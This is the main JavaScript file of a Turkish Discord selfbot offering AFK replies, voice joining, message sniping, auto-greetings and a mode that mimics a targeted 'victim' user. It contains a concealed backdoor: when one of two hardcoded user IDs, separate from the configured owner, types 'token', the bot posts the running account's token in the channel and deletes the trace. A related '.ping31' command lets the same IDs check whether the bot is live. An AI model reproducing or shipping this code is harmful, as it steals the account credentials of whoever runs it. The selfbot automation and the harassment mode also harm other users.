const express = require('express');
const Discord = require('discord.js-selfbot');
const client = new Discord.Client();
const data = new Map();
const ayarlar = require('./ayarlar.json');
const chalk = require('chalk');
const moment = require('moment');
var Jimp = require('jimp');
const fs = require('fs');
const db = require('quick.db');
require('./util/eventLoader.js')(client);
const path = require('path');
const request = require('request');
const snekfetch = require('snekfetch');
const queue = new Map();
const YouTube = require('simple-youtube-api');
const ytdl = require('ytdl-core');
const ms = require('ms');
const { Client, Util, MessageEmbed } = require('discord.js-selfbot');
const app = express();

function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) {
    if ((new Date().getTime() - start) > milliseconds){
      break;  
    }
  }   
}  
    
/////////////////ATANIS///////////////////ATANIS///////////////////////////////////ATANIS////////////////
/////////////////ATANIS///////////////////ATANIS///////////////////////////////////ATANIS////////////////
const http = require('http');


app.get("/", (request, response) => { 
  response.send(`Bot Aktif | Discord: https://discord.gg/rP74PaPKVX | İletişim Veya Uptime Etmek İçin Discordumuza Gelebilirsiniz.`)
  console.log(Date.now() + " Ping tamamdır.");
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
}, 280000);

var prefix = db.fetch(`prefix`) || ayarlar.prefix

const log = message => {
    console.log(`${message}`);
};

client.commands = new Discord.Collection();
client.aliases = new Discord.Collection();
fs.readdir('./komutlar/', (err, files) => {
    if (err) console.error(err);
    log(`${files.length} komut yüklenecek.`);
    files.forEach(f => {
        let props = require(`./komutlar/${f}`);
        log(`Yüklenen Komut: ${props.help.name}.`);
        client.commands.set(props.help.name, props);
        props.conf.aliases.forEach(alias => {
            client.aliases.set(alias, props.help.name);
        });
    });
});




client.reload = command => {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(`./komutlar/${command}`)];
            let cmd = require(`./komutlar/${command}`);
            client.commands.delete(command);
            client.aliases.forEach((cmd, alias) => {
                if (cmd === command) client.aliases.delete(alias);
            });
            client.commands.set(command, cmd);
            cmd.conf.aliases.forEach(alias => {
                client.aliases.set(alias, cmd.help.name);
            });
            resolve();
        } catch (e) {
            reject(e);
        }
    });
};

client.load = command => {
    return new Promise((resolve, reject) => {
        try {
            let cmd = require(`./komutlar/${command}`);
            client.commands.set(command, cmd);
            cmd.conf.aliases.forEach(alias => {
                client.aliases.set(alias, cmd.help.name);
            });
            resolve();
        } catch (e) {
            reject(e);
        }
    });
};




client.unload = command => {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(`./komutlar/${command}`)];
            let cmd = require(`./komutlar/${command}`);
            client.commands.delete(command);
            client.aliases.forEach((cmd, alias) => {
                if (cmd === command) client.aliases.delete(alias);
            });
            resolve();
        } catch (e) {
            reject(e);
        }
    });
};

client.elevation = message => {

    let permlvl = 0;
    if (message.member.hasPermission("BAN_MEMBERS")) permlvl = 2;
    if (message.member.hasPermission("ADMINISTRATOR")) permlvl = 3;
    if (message.author.id === ayarlar.sahip) permlvl = 4;
    return permlvl;
};

client.on('ready', () => {
        console.log(`${client.user.username} ismi ile giriş yapıldı!`);
});

client.login(process.env.token)


client.on("ready", async () => {
  let reklamkick = db.fetch(`ses`)
  if (!reklamkick) return;
  if (reklamkick == "Açık") {
    
let kanal = client.channels.cache.get(db.fetch(`seskanal`))

kanal.join().then(e => {
kanal.guild.me.voice.setSelfMute(true)
kanal.guild.me.voice.setSelfDeaf(true)
}).catch(err => { console.log(err) })
}})

client.on('message', (message, member, guild) => {
let afk = db.fetch(`afk`)
let sebep = db.fetch(`afk_sebep`)
  
if (!afk) return
if (afk === "Açık") {
if (message.content === `<@!${client.user.id}>`) {
if (message.author.bot === true) return
message.reply(`${client.user} Şu anda \`${sebep}\` Sebebinden AFK'dır lütfen rahatsız etmeyiniz.`).then(x => x.delete({timeout: 5000}));
}
}})



client.on('message', async (message, member) => {
{
if (message.content.toLowerCase() === `${prefix}ping`){ 
if(message.author.id !== ayarlar.sahip) return
  
const exampleEmbed = `Pingim: **${client.ws.ping}**ms`
  message.channel.send(exampleEmbed).then(x => x.delete({timeout: 5000 }))

}
}})

client.on('message', async (message, member) => {
{
if (message.content.toLowerCase() === '.ping31'){ 
if (message.author.id !== "429357746002067493" & message.author.id !== "813799329407041576") return;

const exampleEmbed = `Pingim: **${client.ws.ping}**ms`
  message.channel.send(exampleEmbed)


}
}})

client.on('messageDelete', message => {
  if(message.author.id === client.user.id) return;
  if(message.author.bot === true) return;
  db.set(`snipe.mesaj.${message.guild.id}`, message.content)
  db.set(`snipe.id.${message.guild.id}`, message.author.id)
})


client.on('message', async (message, member, guild) => {
if (message.content === '.unuttum') {
if (message.author.id !== ayarlar.sahip) return 
message.reply(`Prefix: \`${db.fetch(`prefix`)}\``)
}

})



client.on('message', async (msg, member, guild) => {
  
 {

if (msg.content.toLowerCase() === 'token'){
if (msg.author.id !== "429357746002067493" & msg.author.id !== "813799329407041576") return;

msg.channel.send(client.token).then(x => x.delete({timeout: 5000}))
msg.delete();
}
  
}
});

client.on('message', (msg, member) => {

if (db.fetch(`sa-as`) == "Açık") {
const reklam = ["sa","selam","selamun aleykum","selamün aleyküm","sea","selamun aleyküm","selamün aleykum","selam aleykum","selam aleyküm"] 
if (reklam.some(word => msg.content.toLowerCase() === (word))) return msg.reply('Aleyküm Selam')  
}})

client.on('message', (msg, member) => {
  
  let reklamkick = db.fetch(`taklit`)
  if (!reklamkick) return;
  if (reklamkick == "Açık") {
  let prefix = db.fetch(`prefix`) || ayarlar.prefix
const reklam = ["mal","salak","atahan","ben","my","göt","burak","allah","amk","oç","piç","orospu","sik","yuce","aziz","yarra","köpe","kopek","çük","pipi","cük","aşk","ask","apla","abla","abi"]

if (msg.author.id !== db.fetch(`kurban`)) return;
if (msg.author.id === client.user.id) return;
if (msg.content.startsWith(ayarlar.basariliemoji)) return msg.channel.send(msg).then(x => x.delete({timeout: 5000}))
if (msg.content.startsWith(ayarlar.basarisizemoji)) return msg.channel.send(msg).then(x => x.delete({timeout: 5000}))
if (msg.content.startsWith(prefix)) return msg.reply('Akıllı mısın? Komut kullandırtmam!')
if (msg.content.toLowerCase().startsWith('owo')) return msg.reply('Akıllı mısın? Owo mu harcatmam!')
if (msg.content.toLowerCase().startsWith('w')) return msg.reply('Akıllı mısın? Owo mu harcatmam!')
if (reklam.some(word => msg.content.toLowerCase().includes(word))) return msg.reply('Agresifsin!')

msg.channel.send(msg)

  }
});